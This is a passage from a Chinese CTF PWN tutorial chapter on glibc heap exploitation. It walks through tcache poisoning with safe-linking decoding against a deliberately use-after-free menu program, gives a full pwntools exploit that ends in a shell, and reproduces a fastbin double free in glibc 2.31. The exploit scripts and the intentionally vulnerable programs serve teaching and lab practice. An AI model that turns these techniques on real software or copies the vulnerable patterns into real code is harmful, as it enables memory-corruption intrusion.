---
chapter: PWN
section: tcache 与 fastbin 利用
order: 314
tags:
  - CTF
  - PWN
  - 堆
publish: true
---

# P14 tcache 与 fastbin 利用
## tcache & Fastbin Attacks

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L3 堆上利用期 ｜ **前置要求**：[[P12-glibc堆管理机制|P12]] · [[P13-基础堆漏洞|P13]]
> **本章目标**：把 tcache poisoning 的完整链路——泄露堆地址、解密 safe-linking、伪造 fd、两次 malloc 拿到任意地址——按 glibc 2.43 的实际行为一步步走通并 getshell 收尾；把 fastbin 利用作为历史技术讲清原理、搭出 glibc 2.31 的历史环境复现 classic double free、说明它为什么被移除；再按 2.43 的行为走通 tcache stashing unlink attack；最后汇总任意地址分配之后的落点决策与逐版本适用表。

## 1. 任意地址分配：堆利用的兑换环节

[[P13-基础堆漏洞|P13]] 给出了堆漏洞的原料：悬垂指针让已释放的块仍可读写，编辑它就是编辑管理器的链表。本章把这些原料兑换成控制权。兑换的第一步几乎总是同一个：

==让 malloc 返回一个攻击者选定的地址==（下文简称"任意地址分配"）。

malloc 本质上是链表操作的封装（[[P12-glibc堆管理机制#4. malloc 的主干流程|P12 第 4 节]]）：从某条 bin 的链上摘一块、返回。链表上的指针存在堆内容里，[[P13-基础堆漏洞|P13]] 的编辑原语碰得到它们——于是"改一个链表指针"就等价于"指挥下一次 malloc 的去向"。拿到任意地址之后，往那里写什么、由谁触发，决定了最后一步怎么打，这是第 8 节的落点决策表。

本章的三个技术与位置：

| 技术 | 适用版本 | 本章位置 |
| ---- | ---- | ---- |
| tcache poisoning | 2.26 起；本机 2.43 为主线（含 safe-linking 加解密） | 第 3、4 节 |
| fastbin 利用（double free + 伪造 fd） | ≤ 2.40（2.43 已整体移除） | 第 5、6 节 |
| tcache stashing unlink attack | 2.29 起的形态；2.43 上仍成立 | 第 7 节 |

> [!note] 版本口径
> 主线按本机 glibc 2.43 讲解；fastbin 按 ≤ 2.40 的行为讲原理，并搭出 ubuntu 20.04 的 glibc 2.31 历史环境把 classic 打法完整过一遍。2.41–2.43 三年 malloc 被大幅重写（fastbin 移除、每档上限 7→16、计数语义反转、tcache 结构推迟分配），与老资料的差异对照表在 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]，读老题解先查那张表。

## 2. 演示程序与调试装备

### 2.1 菜单堆题的最小形态

典型的堆题是一个菜单程序——new 分配、edit 编辑、free 释放、show 打印。本章的演示程序 `p14_uaf.c` 就是它的最小形态，四个功能各留一个漏洞口（x86-64 Linux / System V AMD64 ABI，本章所有示例相同）：

```c
/* p14_uaf.c —— tcache poisoning 演示程序（glibc 2.43）
 * alloc：malloc(0x68) 后读 8 字节
 * edit ：对已分配槽位再写 8 字节
 * free ：释放槽位，指针不清空 —— UAF
 * show ：打印槽位指向内存的前 8 字节 —— 堆上内容泄露
 * call ：调用函数指针 fp —— fp 初始指向 greet，永远轮不到 win
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void *slots[4];

void *fp;               /* 利用目标：bss 里的函数指针 */

void win(void) {
    system("/bin/sh");
}

void greet(void) {
    puts("hello from greet");
}

int readn(void *buf, int n) {
    int r = read(0, buf, n);
    if (r <= 0) _exit(1);
    return r;
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    fp = greet;
    for (;;) {
        int op, idx;
        printf("1.alloc 2.edit 3.free 4.show 5.call >> ");
        if (scanf("%d", &op) != 1) return 0;
        if (op == 5) { ((void (*)(void))fp)(); continue; }
        printf("idx >> ");
        if (scanf("%d", &idx) != 1) return 0;
        if (idx < 0 || idx > 3) { puts("bad idx"); continue; }
        if (op == 1) {
            slots[idx] = malloc(0x68);
            printf("mem = %p\n", slots[idx]);
            printf("data >> ");
            readn(slots[idx], 8);
        } else if (op == 2) {
            if (!slots[idx]) { puts("empty"); continue; }
            printf("data >> ");
            readn(slots[idx], 8);
        } else if (op == 3) {
            if (!slots[idx]) { puts("empty"); continue; }
            free(slots[idx]);          /* 指针不清空：悬垂指针 */
        } else if (op == 4) {
            if (!slots[idx]) { puts("empty"); continue; }
            write(1, slots[idx], 8);
            puts("");
        }
    }
    return 0;
}
```

四个关键点：

- `free` 之后 `slots[idx]` 不清空——悬垂指针，[[P13-基础堆漏洞|P13]] 的标准原料；
- `edit` 对已释放的块照样可写——==编辑悬垂指针就是编辑 tcache 链上的 fd==；
- `show` 读 8 字节——把 fd 槽的内容带出来，泄露的入口；
- 利用目标是 bss 里的函数指针 `fp`：`call` 功能调用它，它初始指向 `greet`，`win`（`system("/bin/sh")`）写在旁边永远轮不到——==让 `call` 拿到 shell，就是本章主线的完整收尾==。

### 2.2 编译与调试脚本

```bash
gcc -O0 -g -fno-pie -no-pie -fno-stack-protector p14_uaf.c -o p14_uaf
```

堆的现场观察沿用 [[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]的 `heapview.py` + `tcacheview.py`，不重复贴。观察命令文件在 7.5 的批处理骨架上只改断点部分：

```text
# gdb.cmds —— 跑法：gdb -q -batch -x gdb.cmds ./演示程序
set pagination off
set confirm off
source heapview.py
break mark
commands
silent
printf ">>>>> %s\n", (char*)$rdi
tcacheview
continue
end
run
```

地址口径说明：GDB 默认关闭 ASLR，会话之内的地址稳定可对照（[[P04-Linux安全缓解机制|P4]]）；pwntools 直接跑进程时 ASLR 开着，每次运行的堆地址都不同——==数值会变，形状与相对关系不变==，对照输出时以形状为准。

## 3. tcache poisoning：完整主线

### 3.1 原理：一条完全由用户数据决定的链

tcache 每档是一条单链 LIFO（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]）：free 把块头插进 `entries[idx]`，块在 mem 处写入"加密后的下一块地址"；malloc 从头取。两个事实叠出攻击面：

- **块进链之后，mem 处就是 fd 槽**——UAF 的 edit 写它，就是在改链；
- **malloc 弹头结点时，把"它身体里存的加密 next"解密后登记为新链表头**，==对解密结果只查 0x10 对齐，不做任何指向检查==——链上某块的 next 被改成 target，两次 malloc 之后 target 就被当作块返回。

所以条件清单很短：一次写（UAF 或溢出）、一次泄露（safe-linking 让 fd 不是明文，必须先拿到解密量）、目标地址 0x10 对齐。泄露与解密是本章主线比老教程多出来的两步，先看加密公式：

$$\text{存储值} = \left( \text{存储位置} \gg 12 \right) \oplus \text{真值} \tag{14.1}$$

存储位置是这个槽自己的地址（mem 处）。解密就是反解：

$$\text{真值} = \text{存储值} \oplus \left( \text{存储位置} \gg 12 \right) \tag{14.2}$$

异或的自反性（`x ^ y ^ y == x`）让加密与解密是同一个函数：

```python
def pro(pos, val):     # 写入前加密（PROTECT_PTR）
    return (pos >> 12) ^ val

reveal = pro           # 读出后解密（REVEAL_PTR）：同一个函数
```

### 3.2 第一步：show 读出空链形状，拿到堆页号

泄露要趁链为空时做。先 alloc 两块，free 掉第一块——这是本线程第一次 free，tcache 结构在这里才诞生（[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]第 5 步），随后 chunk0 头插进空链。空链的存储值按式 14.1 是 `真值(NULL) ^ (自身位置 >> 12)` = 自身位置右移 12 位——[[P12-glibc堆管理机制#8. 一条 malloc/free 序列的全程跟踪|P12 第 8 节]] B 阶段那个"不像指针的小数" `0x405` 就是它。

`show(0)` 把这个值带出来。它本身就是==堆页号==：首个分配的块固定在堆区起点的 0x10 偏移处（P12 第 8 节 A 阶段），所以存储值左移 12 位正好是堆区起点。

### 3.3 第二步：解密 safe-linking，还原真值

接着 free 掉 chunk1，链变成 `chunk1 -> chunk0`。此时 `show(1)` 读到的是 chunk0 的==加密值==。解密只需要一次异或——异或量 `(存储位置 >> 12)` 已经在上一步到手（chunk0 和 chunk1 在同一页，右移 12 位是同一个数）：

```text
[泄露2] fd 槽存储值 = 0xa9b19ab（chunk0 的加密值）
[解密] chunk1_mem >> 12 = 0xa9bb
[解密] 还原出的下一块   = 0xa9bb010（应等于 chunk0 mem）
```

还原结果与程序自己打印的 chunk0 mem 一致，解密公式成立。这里藏着 safe-linking 的一个结构性弱点：==异或量对同一页内的所有槽是同一个值==，拿到一次页号就能解密这条链上的任何一跳——它防的是"把堆地址当数据直接读走"，防不住"能读堆内容"的攻击者。

### 3.4 第三步：伪造 fd，把目标挂进链

目标选 `fp`（bss 的函数指针）。写入也要按式 14.1 加密——管理器取出时会按同一公式解密，写明文等于写了一个错地址：

```python
fake_fd = pro(chunk1_mem, target)      # = target ^ (chunk1_mem >> 12)
edit(1, p64(fake_fd))                  # 悬垂指针写 = 改 tcache 链
```

这次运行里 `fake_fd = 0x40e91b`（`0x4040a0 ^ 0xa9bb`）。链从 `chunk1 -> chunk0` 变成 `chunk1 -> fp`，而管理器的账本（剩余容量）一个字都没动——第 3.7 节的 GDB 现场能直接看到这一点。

> [!warning] 目标地址必须 0x10 对齐，周边 16 字节必须可写
> 取出时管理器做对齐检查，不对齐直接报错终止：
> ```text
> malloc(): unaligned tcache chunk detected
> ```
> 弹出目标还有两个副作用：目标处的前 8 字节被当作链的下一跳读走、第 9–16 字节被写入 NULL（key 清零）。选落点时确认这两处可访问、可写，且不是承重的数据。bss 里声明的指针变量天然 0x10 对齐，是练习阶段最省心的落点。

### 3.5 第四步：两次 malloc，第二次拿到目标地址

之后连续 `malloc(0x68)` 两次：第一次弹出 chunk1（链表头回到 `entries[idx]` 时按式 14.2 解密出 fp 的地址）；第二次直接把 fp 的地址当作 mem 返回——==bss 里的一个函数指针，被 malloc 当成了"用户块"交付==。`alloc` 自带 8 字节读入，这一次分配顺带把 `win` 的地址写进了 `fp`。

### 3.6 完整 exploit 与 getshell 收尾

```python
#!/usr/bin/env python3
# exp_poison.py —— tcache poisoning 完整流程（glibc 2.43，safe-linking 加解密全程展示）
# 用法：python3 exp_poison.py ./p14_uaf
from sys import argv
from pwn import *

context.log_level = 'info'
context.binary = elf = ELF(argv[1] if len(argv) > 1 else './p14_uaf')

p = process(argv[1] if len(argv) > 1 else './p14_uaf')

def alloc(idx, data=b'AAAA'):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.recvuntil(b'mem = ')
    mem = int(p.recvline().strip(), 16)
    p.sendafter(b'data >> ', data.ljust(8, b'\x00'))
    return mem

def edit(idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendafter(b'data >> ', data.ljust(8, b'\x00'))

def free(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'idx >> ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    return p.recvn(8)

# ---- 第 1 步：UAF 泄露堆地址（空链形状的 fd 就是堆页号）----
a = alloc(0)
b = alloc(1)

free(0)                       # tcache[0x70]: chunk0；首次 free 顺带分配 tcache 结构
leak1 = u64(show(0))
print('[泄露1] fd 槽存储值 = %#x（空链形状）' % leak1)
heap_page = leak1 << 12       # 存储值 = 存储位置 >> 12，左移 12 位还原堆页
print('[泄露1] 堆页基址   = %#x' % heap_page)

# ---- 第 2 步：解密 safe-linking，还原真值 ----
free(1)                       # tcache[0x70]: chunk1 -> chunk0
leak2 = u64(show(1))
print('[泄露2] fd 槽存储值 = %#x（chunk0 的加密值）' % leak2)

def decrypt(pos, stored):
    """REVEAL_PTR：真值 = 存储值 XOR (存储位置 >> 12)"""
    return stored ^ (pos >> 12)

next_real = decrypt(b, leak2)
print('[解密] chunk1_mem >> 12 = %#x' % (b >> 12))
print('[解密] 还原出的下一块   = %#x（应等于 chunk0 mem）' % next_real)
assert next_real == a, '解密结果与程序打印的 chunk0 不一致'

# ---- 第 3 步：伪造 fd 指向目标（写入也要按同一公式加密）----
target = elf.symbols['fp']
print('[目标] fp @ %#x  win @ %#x' % (target, elf.symbols['win']))
assert target % 16 == 0, '目标必须 0x10 对齐（tcache_get 的对齐检查）'
fake_fd = target ^ (b >> 12)          # PROTECT_PTR：加密后的伪造 fd
print('[伪造] 加密 fd = target ^ (chunk1_mem>>12) = %#x' % fake_fd)
edit(1, p64(fake_fd))                 # 悬垂指针写 = 改 tcache 链

# ---- 第 4 步：两次 malloc，第二次拿到目标地址 ----
c = alloc(2)                          # 弹出 chunk1
print('[分配] 第 1 次 malloc = %#x' % c)
d = alloc(3, p64(elf.symbols['win'])) # 弹出 fp 本身，顺带写入 win 地址
print('[分配] 第 2 次 malloc = %#x（fp 的地址被当成了 mem）' % d)
assert d == target

# ---- 第 5 步：fp 已指向 win，call 触发 ----
p.sendlineafter(b'>> ', b'5')
p.sendline(b'echo PWNED-GETSHELL; id')
p.interactive()
```

运行（地址是 ASLR 开着的一次运行，每次都不同）：

输出：

```text
chunk0 mem = 0xa9bb010
chunk1 mem = 0xa9bb080
[泄露1] fd 槽存储值 = 0xa9bb（空链形状）
[泄露1] 堆页基址   = 0xa9bb000
[泄露2] fd 槽存储值 = 0xa9b19ab（chunk0 的加密值）
[解密] chunk1_mem >> 12 = 0xa9bb
[解密] 还原出的下一块   = 0xa9bb010（应等于 chunk0 mem）
[目标] fp @ 0x4040a0  win @ 0x401256
[伪造] 加密 fd = target ^ (chunk1_mem>>12) = 0x40e91b
[分配] 第 1 次 malloc = 0xa9bb080
[分配] 第 2 次 malloc = 0x4040a0（fp 的地址被当成了 mem）
[*] Switching to interactive mode
PWNED-GETSHELL
```

最后一段是 exploit 进入交互后 shell 执行 `echo` 的回显——`call` 调用的已经不是 `greet`，`win` 交出的 shell 在执行 exploit 发的命令。全程六步：泄露页号、解密、加密伪造、两次分配、一次写入、一次触发。真实题目没有 `win` 函数，最后一步的落点换成什么，见第 8 节。

### 3.7 GDB 全程观察：链怎么被改、账本怎么不动

把同样的流程写成分阶段的程序，配合 `gdb.cmds` 在每个 `mark` 处用 `tcacheview` 看账：

```c
/* p14_gdb.c —— tcache poisoning 各阶段的堆现场（glibc 2.43） */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void *slots[4];
void *fp;               /* 利用目标：bss 函数指针 */

void win(void)  { puts("YOU WIN"); }
void greet(void){ puts("hello from greet"); }

static void mark(const char *s) { printf("---- %s ----\n", s); }

int main(void) {
    setbuf(stdout, NULL);
    fp = greet;

    char *a = malloc(0x68);
    char *b = malloc(0x68);
    printf("a = %p\nb = %p\nfp 变量 @ %p\n", a, b, (void *)&fp);
    mark("A: 两次 malloc(0x68) 完成");

    free(a);
    mark("B: free(a) 完成（首次 free，tcache 结构就位）");

    free(b);
    mark("C: free(b) 完成（链上 2 块，剩余容量 14）");

    /* UAF：编辑悬垂指针 = 直接改 tcache 链上的 fd */
    unsigned long heap_page = (unsigned long)b >> 12;
    unsigned long fake = (unsigned long)&fp ^ heap_page;
    printf("heap_page = %#lx  加密 fake fd = %#lx\n", heap_page, fake);
    *(unsigned long *)b = fake;
    mark("D: 伪造 fd 写入完成（链变成 b -> fp，剩余容量不变）");

    void *c = malloc(0x68);
    printf("第 1 次 malloc = %p\n", c);
    mark("E: 第 1 次 malloc 完成（弹出 b）");

    void *d = malloc(0x68);
    printf("第 2 次 malloc = %p（fp 的地址被当成 mem 返回）\n", d);
    mark("F: 第 2 次 malloc 完成（弹出 fp）");

    *(void **)d = (void *)win;      /* 这一次写入落在 bss 的 fp 上 */
    ((void (*)(void))fp)();
    return 0;
}
```

输出：

```text
a = 0x405010
b = 0x405080
fp 变量 @ 0x404080
>>>>> A: 两次 malloc(0x68) 完成
堆上没有 tcache 结构：glibc 2.43 在第一次 free 时才分配它
>>>>> B: free(a) 完成（首次 free，tcache 结构就位）
tcache 结构 @ 0x4050f0（chunk 0x4050e0，size 0x300）
tcache[0x070] 剩余容量 15 链(1): 0x405010
>>>>> C: free(b) 完成（链上 2 块，剩余容量 14）
tcache 结构 @ 0x4050f0（chunk 0x4050e0，size 0x300）
tcache[0x070] 剩余容量 14 链(2): 0x405080 -> 0x405010
heap_page = 0x405  加密 fake fd = 0x404485
>>>>> D: 伪造 fd 写入完成（链变成 b -> fp，剩余容量不变）
tcache 结构 @ 0x4050f0（chunk 0x4050e0，size 0x300）
tcache[0x070] 剩余容量 14 链(1): 0x405080
第 1 次 malloc = 0x405080
>>>>> E: 第 1 次 malloc 完成（弹出 b）
tcache 结构 @ 0x4050f0（chunk 0x4050e0，size 0x300）
tcache[0x070] 剩余容量 15 链(0):
第 2 次 malloc = 0x404080（fp 的地址被当成 mem 返回）
>>>>> F: 第 2 次 malloc 完成（弹出 fp）
tcache 结构 @ 0x4050f0（chunk 0x4050e0，size 0x300）
tcache[0x070] 剩余容量 16 链(0):
YOU WIN
```

逐阶段读账（GDB 关了 ASLR，地址与会话内一致）：

| 阶段 | 现场要点 |
| ---- | ---- |
| A | tcache 结构不在场——2.43 在首次 free 时才分配它（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
| B | 结构就位（0x4050e0）；0x70 档剩余容量 15、链上 1 块 |
| C | 剩余容量 14、链上 2 块——`16 = 14 + 2`，账是平的 |
| D | 伪造 fd 写入后==剩余容量仍是 14==：这次写发生在用户数据区，管理器的账本一个字没动；链显示"链(1)"是脚本按堆区间截断——下一跳 0x404080 已经出了堆（fp 变量在 bss） |
| E | 弹出 b：容量 15；链显示"链(0)"同理——`entries[idx]` 已变成解密出的堆外地址 |
| F | 弹出 fp：容量回到 16，这一档两清，`fp` 已拿到手 |

D 阶段那笔"名义上不平的账"（14 加不出来）值得单独记：==剩余容量与链长的恒等式被破坏，说明这条链被人动过==。反过来用它，调试自己的 poisoning 时一眼能看出"写没写进去、写的是不是地方"。

## 4. tcache 的账本：num_slots 与结构本体

poisoning 只动了链，tcache 还有半本账：每档的剩余容量。两个利用相关的细节：

- **num_slots 决定 free 的去向**。free 时该档 `num_slots > 0` 才进 tcache；减到 0 这一档就满，后续 free 落入合并路径（[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]第 4 步）。2.43 装满一档要 ==16 次== free——第 17 个小块直接进 smallbin。==堆布局的步距按 16 算==，这是老题解（按 7 算）在新环境失灵的第一原因。
- **恒等式是检测器**。某档的 `剩余容量 + 链上块数 = 16`（[[P12-glibc堆管理机制#7.3 tcacheview：定位结构并还原加密链|P12 7.3]]）在正常进出时永远成立；poisoning 之后账面对不上。做堆题时先用 `tcacheview` 对一遍账，再动手写 exploit。

还有一句话要说在前面：==tcache 结构本体也是堆上的一个 0x300 块==。poisoning 的落点选它，一次分配就能整体接管 76 档的剩余容量与链表头——一条链都不用逐个改。

> [!info]- 落点选 tcache 结构本体时的形状
> `tcache_perthread_struct` 的前 152 字节是 76 个 `uint16` 的剩余容量，之后是 76 个明文链表头（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]）。把 malloc 指到它头上，写入的每 8 字节都直接变成四档的账目加链头——适合"要同时对很多档动手"的场景。代价是结构在堆上的位置不固定（2.43 首次 free 才分配），要先像 `tcacheview` 那样按内容特征定位它。

## 5. fastbin 利用：历史技术（glibc ≤ 2.40）

fastbin 的机制本体在 [[P12-glibc堆管理机制#3.6 fastbin：已经退场的经典机制|P12 3.6]] 已交代：单链 LIFO、只收 chunk 0x20–0x80、tcache 满后才轮到它。==glibc 2.43 已把它整体移除==，本节的打法在本机直接跑不了——先把原理讲清，再搭一个 2.31 的历史环境把它完整过一遍，最后回 2.43 看同一份源码的下场。

### 5.1 机制三件套

- **单链 LIFO，头插头取**。free 头插 fd，malloc 取头，后释放的先回来。fd 存的是==chunk 地址==（不是 mem 地址，与 tcache 差 0x10，5.4 会踩到这个差别）。
- **取出时的 size 合法性检查**。malloc 从 fastbin 取块时验证：

$$\text{fastbin\_index}(size) = \left( size \gg 4 \right) - 2 \stackrel{?}{=} idx \tag{14.3}$$

  即==伪造块的 size 槽必须落在该档 fastbin 的尺寸区间==（0x70 的档就写 `0x71`：0x70 加 PREV_INUSE 位，`chunksize` 会把标志位剥掉）。不满足直接终止，报错串是 `malloc(): memory corruption (fast)`。
- **classic A-B-A double free**。free 路径对 fastbin 只做一道同块检查：==待释放块是否就是当前链头==（源码里的 `old == p`）。连续 free 同一块会被拦下，但中间夹一块就绕开了：

```text
free(a)   链: a          （a 是链头）
free(b)   链: b -> a     （b 是链头，a 被压到后面）
free(a)   链: a -> b -> a（检查只看链头 b，a 放行——链成环）
```

  a 在链上出现两次，之后 malloc 三次就能把==同一块拿到手两次==，两次返回值指向同一段内存——悬垂指针从"碰运气的窗口"变成==稳定可用的别名==。改其中一个的 fd，另一个跟着变，这就是 fastbin 时代伪造 fd 的标准入口。

### 5.2 历史环境：docker 里的 glibc 2.31

ubuntu:20.04 的 glibc 是 2.31——fastbin 还在、safe-linking 还没引入、tcache 每档上限还是 7，是复现 classic 打法的合适标靶。用 docker 把它的 libc 取出来、再进容器编译运行：

```bash
docker pull ubuntu:20.04
docker create --name p14extract ubuntu:20.04
docker cp p14extract:/usr/lib/x86_64-linux-gnu/libc-2.31.so .
docker cp p14extract:/usr/lib/x86_64-linux-gnu/ld-2.31.so .
docker rm p14extract
```

演示程序 `fastbin.c` 一份源码两种模式（`dup` 走 2.31 默认行为，`pure` 配合 tunable 关掉 tcache 走纯 fastbin 路径）：

```c
/* fastbin.c —— classic fastbin double free（A-B-A）演示（x86-64 Linux）
 * 历史环境：glibc 2.31（ubuntu:20.04）。2.43 无 fastbin，仅作对照。
 * 用法：
 *   ./fastbin dup      默认 tcache 开启的 2.31：先装满 tcache 再 A-B-A，
 *                      观察 malloc 的 fastbin→tcache 暂存如何接管后续分配
 *   ./fastbin pure 0   GLIBC_TUNABLES 关闭 tcache 的纯 fastbin 路径，
 *                      伪造块不带合法 size —— 触发 size 检查报错
 *   ./fastbin pure 1   同上，伪造块 size 槽写入 0x71 —— 通过检查拿到目标
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char fake[0x80] __attribute__((aligned(0x10)));   /* 伪造的目标块 */
static void *sink[16];                                   /* 承接 malloc 返回值，块保持分配 */

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    int mode_dup = (argc > 1 && strcmp(argv[1], "dup") == 0);
    int plant = (argc > 2) ? atoi(argv[2]) : 1;

    if (mode_dup) {
        /* ---- 2.31 默认行为：tcache 在前，fastbin 在后 ---- */
        char *fill[7];
        for (int i = 0; i < 7; i++) fill[i] = malloc(0x68);
        char *a = malloc(0x68);
        char *b = malloc(0x68);
        char *guard = malloc(0x68);
        (void)guard;
        printf("a = %p  b = %p\n", a, b);

        for (int i = 0; i < 7; i++) free(fill[i]);   /* tcache[0x70] 装满 7 个 */
        puts("[1] tcache[0x70] 已满，接下来 free 走 fastbin");
        free(a);
        free(b);
        free(a);        /* fastbin 只查链头：a 夹在 b 后面，A-B-A 放行 */
        puts("[2] free(a); free(b); free(a) 通过，fastbin 链：a -> b -> a");

        for (int i = 0; i < 7; i++) sink[i] = malloc(0x68);   /* 清空 tcache */
        char *x = malloc(0x68);                      /* 从 fastbin 取 a；
                                                        余块被批量暂存进 tcache */
        printf("[3] 第 8 次 malloc = %p（a 回到手里）\n", x);

        unsigned long tgt = (unsigned long)fake + 0x10;   /* tcache 链存 mem 地址（fastbin 的 fd 存 chunk 地址，差 0x10） */
        *(unsigned long *)x = tgt;                   /* a 还在链上：改 next = fake+0x10（明文，2.31 无 safe-linking） */
        printf("[4] 写 a 的 next = %p（fake 的 mem；tcache 取出路径无检查）\n", (void *)tgt);

        char *y = malloc(0x68);
        char *z = malloc(0x68);
        char *w = malloc(0x68);
        printf("[5] 后续三次 malloc = %p / %p / %p\n", y, z, w);
        if (z == x) puts("[5] 第 2 次 == 第 1 次：同一块被分配两次");
        if (w == fake + 0x10) {
            strcpy(w, "FASTBIN PWNED");
            printf("[6] 目标块到手，写入读回：%s\n", fake + 0x10);
        }
    } else {
        /* ---- 纯 fastbin 路径（GLIBC_TUNABLES=glibc.malloc.tcache_count=0）---- */
        char *guard = malloc(0x68);
        (void)guard;
        char *a = malloc(0x68);
        char *b = malloc(0x68);
        printf("a = %p  b = %p\n", a, b);

        free(a);
        free(b);
        free(a);        /* 只查链头，A-B-A 放行 */
        puts("[1] A-B-A 三次 free 通过，fastbin 链：a -> b -> a");

        char *x = malloc(0x68);
        printf("[2] 第 1 次 malloc = %p（a）\n", x);
        unsigned long tgt = (unsigned long)fake;
        if (plant) *(unsigned long *)(fake + 8) = 0x71;   /* size 槽：0x70 | PREV_INUSE */
        *(unsigned long *)x = tgt;
        printf("[3] 写 a 的 fd = %p（fake 块 size 槽 = %#lx）\n", (void *)tgt,
               plant ? 0x71UL : 0x0UL);

        char *y = malloc(0x68);
        char *z = malloc(0x68);
        printf("[4] 第 2 次 malloc = %p（b）/ 第 3 次 malloc = %p（a 又回来了）\n", y, z);
        if (z == x) puts("[4] 第 3 次 == 第 1 次：同一块被分配两次");

        char *w = malloc(0x68);   /* 取 fake：fastbin 路径执行 size 检查 */
        printf("[5] 第 4 次 malloc = %p\n", w);
        if (w == fake + 0x10) {
            strcpy(w, "FASTBIN PWNED");
            printf("[6] 目标块到手，写入读回：%s\n", fake + 0x10);
        }
    }
    return 0;
}
```

在容器里编译并跑三个模式（每个 `docker run` 都是新容器，gcc 要装在命令里）：

```bash
docker run --rm -v $PWD:/work ubuntu:20.04 bash -c \
  'apt-get update -qq && apt-get install -y -qq gcc libc6-dev && \
   cd /work && gcc -O0 -fno-pie -no-pie fastbin.c -o fastbin231 && \
   ./fastbin231 dup && \
   GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./fastbin231 pure 1 && \
   GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./fastbin231 pure 0'
```

`GLIBC_TUNABLES=glibc.malloc.tcache_count=0` 把 tcache 每档容量设为 0——free 和 malloc 都跳过 tcache，整条链路退回纯 fastbin 行为，正好用来单独观察 fastbin 本体的机制。

### 5.3 classic A-B-A double free：size 检查的一正一反

先看 size 槽写入合法值 `0x71` 的 `pure 1`：

输出：

```text
a = 0x2bee9340  b = 0x2bee93b0
[1] A-B-A 三次 free 通过，fastbin 链：a -> b -> a
[2] 第 1 次 malloc = 0x2bee9340（a）
[3] 写 a 的 fd = 0x4040a0（fake 块 size 槽 = 0x71）
[4] 第 2 次 malloc = 0x2bee93b0（b）/ 第 3 次 malloc = 0x2bee9340（a 又回来了）
[4] 第 3 次 == 第 1 次：同一块被分配两次
[5] 第 4 次 malloc = 0x4040b0
[6] 目标块到手，写入读回：FASTBIN PWNED
```

逐步对照 5.1 的三件套：三次 free 全过（检查只看链头）；第 1、2 次 malloc 依链弹出 a、b；第 3 次沿着环==再次返回 a==（别名到手）；中途写入的 fd 在第 4 次被解引用——全局数组 `fake` 被当成 chunk，`fake + 8` 的 `0x71` 通过式 14.3 的检查，`fake + 0x10` 作为 mem 交付，写入读回全部成立。伪造块的布局：

```text
fake 数组被当成 chunk 用：
       +0x00  prev_size（本路径不查）
       +0x08  size = 0x71          ← 必须落在该档 fastbin 区间
       +0x10  mem（malloc 返回它） ← fd 槽，链上下一个 chunk 写在这
```

把 size 槽留成 0 再跑一遍（`pure 0`）——==同一个位置少一个字，结局换成终止==：

输出：

```text
a = 0x3bb18340  b = 0x3bb183b0
[1] A-B-A 三次 free 通过，fastbin 链：a -> b -> a
[2] 第 1 次 malloc = 0x3bb18340（a）
[3] 写 a 的 fd = 0x4040a0（fake 块 size 槽 = 0）
[4] 第 2 次 malloc = 0x3bb183b0（b）/ 第 3 次 malloc = 0x3bb18340（a 又回来了）
[4] 第 3 次 == 第 1 次：同一块被分配两次
malloc(): memory corruption (fast)
```

第 4 次 malloc 在 size 检查处终止：`chunksize(fake)` 算出 0，`fastbin_index(0)` 不是合法档位（式 14.3）。==A-B-A 本身只保证了"同一块能拿两次"，伪造 fd 能不能落地取决于目标处的 size 槽==——这也是 fastbin 时代出题人在非堆区域布置 fake chunk、在堆上溢出改 size 的原因。

### 5.4 tcache 时代的 2.31：暂存纠缠与 0x10 之差

> [!info]- `dup` 模式：2.31 默认行为下的完整输出与解读
> 2.26 起，malloc 从 fastbin 取出一块时会把同档剩余块==批量暂存进 tcache==。所以装满 tcache 再做 A-B-A 之后，第 8 次 malloc（tcache 已清空、落到 fastbin）在返回 a 的同时，把 `a -> b -> a` 的余下部分整个搬进了 tcache——重复的 a 也在其中：
>
> 输出：
>
> ```text
> a = 0x1eeeb5b0  b = 0x1eeeb620
> [1] tcache[0x70] 已满，接下来 free 走 fastbin
> [2] free(a); free(b); free(a) 通过，fastbin 链：a -> b -> a
> [3] 第 8 次 malloc = 0x1eeeb5b0（a 回到手里）
> [4] 写 a 的 next = 0x4040b0（fake 的 mem；tcache 取出路径无检查）
> [5] 后续三次 malloc = 0x1eeeb620 / 0x1eeeb5b0 / 0x4040b0
> [5] 第 2 次 == 第 1 次：同一块被分配两次
> [6] 目标块到手，写入读回：FASTBIN PWNED
> ```
>
> 三个细节值得记：
>
> - **目标照样到手，但走的已是 tcache**。第 2–4 次 malloc 全部从 tcache 弹出（b / a / fake）——暂存把 fastbin 的战果转移进了 tcache 的链表。
> - **写入值差 0x10**。tcache 链上存 ==mem 地址==，fastbin 的 fd 存 ==chunk 地址==；同一份"想要 fake"的意图，两条链要写的值差 `0x10`。混用是新手在这一带最常见的出错点——写错不报错，只是第 N 次 malloc 拿回来一个差 0x10 的地址。
> - **2.31 的 tcache 取出路径没有任何检查**：没有 safe-linking、没有对齐检查、没有 size 检查（对齐检查随 2.32 的 safe-linking 才引入，错误串 `malloc(): unaligned tcache chunk detected` 在 2.31 的 libc 里还不存在）。size 槽写不写 `0x71` 都能过——本例照写，是为了与纯 fastbin 路径共用一份伪造块。

### 5.5 同一份源码回到 2.43

```bash
